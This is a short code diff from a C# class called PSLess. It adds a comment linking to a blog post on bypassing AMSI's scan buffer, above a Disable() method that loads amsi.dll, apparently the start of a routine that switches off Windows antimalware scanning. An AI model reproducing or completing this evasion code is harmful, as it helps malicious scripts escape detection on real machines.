@@ -42,6 +42,7 @@ class PSLess
     }
     return buffer;
   }
+   //https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/
    public static int Disable()
         {
             IntPtr TargetDLL = LoadLibrary("amsi.dll");
